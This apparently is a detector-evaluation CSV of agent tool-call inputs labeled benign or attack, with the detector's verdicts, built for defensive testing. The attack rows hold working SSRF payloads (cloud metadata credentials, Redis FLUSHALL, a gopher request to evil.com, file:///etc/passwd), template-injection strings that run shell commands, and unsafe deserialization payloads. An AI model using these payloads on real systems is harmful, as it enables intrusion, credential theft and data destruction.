+send_webhook,"{""url"": ""https://hooks.example.com/webhook/12"", ""payload"": {""event"": ""event_12""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://webhook.site/16"", ""payload"": {""data"": 16}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 20""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://webhook.site/30"", ""payload"": {""data"": 30}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 26""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 4""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 34""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://webhook.site/unique-id"", ""payload"": {""test"": true}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://webhook.site/24"", ""payload"": {""data"": 24}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://hooks.slack.com/services/xxx/yyy/zzz"", ""payload"": {""text"": ""Alert""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 28""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://internal.corp.net/webhook"", ""payload"": {""token"": ""xxx""}}",attack,attack,0.95,secrets_access,True,attack
+send_webhook,"{""url"": ""http://localhost:6379/"", ""payload"": ""*1\r\n$8\r\nFLUSHALL\r\n""}",attack,attack,0.95,ssrf_attacks,True,attack
+send_webhook,"{""url"": ""gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>"", ""payload"": {}}",attack,attack,0.95,ssrf_attacks,True,attack
+send_webhook,"{""url"": ""http://127.0.0.1:9200/_search"", ""payload"": {""query"": {""match_all"": {}}}}",attack,attack,0.95,ssrf_attacks,True,attack
+send_webhook,"{""url"": ""http://169.254.169.254/latest/meta-data/iam/security-credentials/"", ""payload"": {}}",attack,attack,0.95,ssrf_attacks,True,attack
+send_webhook,"{""url"": ""http://2852039166/latest/meta-data/"", ""payload"": {}}",attack,defer,0.0,,False,benign
+send_webhook,"{""url"": ""file:///etc/passwd"", ""payload"": {}}",attack,attack,0.95,system_files,True,attack
+send_webhook,"{""url"": ""https://admin-api.company.com/notify"", ""payload"": {""secret"": ""yyy""}}",attack,defer,0.0,,False,benign
+render_template,"{""template"": ""Hello, {{name}}!"", ""data"": {""name"": ""John""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 16"", ""data"": {""name"": ""User16""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 14""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 22""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 30""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""User: {{user.name}} ({{user.email}})"", ""data"": {""user"": {""name"": ""Jane"", ""email"": ""jan",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 18}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 34"", ""data"": {""name"": ""User34""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 10}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 6"", ""data"": {""name"": ""User6""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 20"", ""data"": {""name"": ""User20""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 4"", ""data"": {""name"": ""User4""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Order #{{order_id}} - Total: ${{total}}"", ""data"": {""order_id"": 123, ""total"": 99.99}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 12""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 24"", ""data"": {""name"": ""User24""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 32""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 2}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Items: {% for item in items %}{{item}}, {% endfor %}"", ""data"": {""items"": [""a"", ""b"", ""c",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 8}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 0}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""<h1>{{title}}</h1><p>{{content}}</p>"", ""data"": {""title"": ""Welcome"", ""content"": ""Hello ",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Date: {% now 'Y-m-d' %}"", ""data"": {}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 26""}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 28}}",benign,defer,0.0,,False,benign
+render_template,"{""template"": ""{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"", ""data"": {}}",attack,defer,0.0,,False,benign
+render_template,"{""template"": ""API Key: {{api_key}}"", ""data"": {""api_key"": ""sk-xxx""}}",attack,attack,0.95,secrets_access,True,attack
+render_template,"{""template"": ""Password: {{password}}"", ""data"": {""password"": ""secret""}}",attack,attack,0.95,secrets_access,True,attack
+render_template,"{""template"": ""{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/pass",attack,attack,0.95,system_files,True,attack
+render_template,"{""template"": ""{{constructor.constructor('return this.process')().mainModule.require('child_process')",attack,attack,0.95,xss_injection,True,attack
+render_template,"{""template"": ""${{<%[%'\""}}%\\."", ""data"": {}}",attack,defer,0.0,,False,benign
+render_template,"{""template"": ""<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"", ""data"": {}}",attack,defer,0.0,,False,benign
+render_template,"{""template"": ""${T(java.lang.Runtime).getRuntime().exec('id')}"", ""data"": {}}",attack,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 24, \""name\"": \""item24\""}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 18, \""name\"": \""item18\""}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""msgpack"", ""data"": ""base64_encoded_msgpack""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 10, \""name\"": \""item10\""}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 16}]}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""xml"", ""data"": ""<data><item>test</item></data>""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""name\"": \""test\""}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 22, \""name\"": \""item22\""}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""toml"", ""data"": ""[database]\nhost = \""localhost\""""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 6}]}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""name: test\nvalue: 123""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 26}]}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 2\\nname: item2""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 28}]}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 30\\nname: item30""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 1}]}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 12\\nname: item12""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 20, \""name\"": \""item20\""}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 14, \""name\"": \""item14\""}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 32\\nname: item32""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 4\\nname: item4""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 8\\nname: item8""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""settings:\n  debug: false\n  port: 3000""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 0}]}""}",benign,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""credentials\"": {\""key\"": \""secret\""}}""}",attack,attack,0.95,secrets_access,True,attack
+deserialize_data,"{""format"": ""php"", ""data"": ""O:8:\""stdClass\"":1:{s:4:\""evil\"";s:20:\""system('id');\""}""}",attack,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/new:subprocess.check_output [['cat', '/etc/passwd']]""}",attack,attack,0.95,system_files,True,attack
+deserialize_data,"{""format"": ""yaml"", ""data"": ""api_key: sk-xxx""}",attack,attack,0.95,secrets_access,True,attack
+deserialize_data,"{""format"": ""java"", ""data"": ""rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==""}",attack,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/apply:os.system ['id']""}",attack,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""pickle"", ""data"": ""gASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==""}",attack,defer,0.0,,False,benign
+deserialize_data,"{""format"": ""ruby"", ""data"": ""!ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Dependency",attack,attack,0.95,command_injection,True,attack
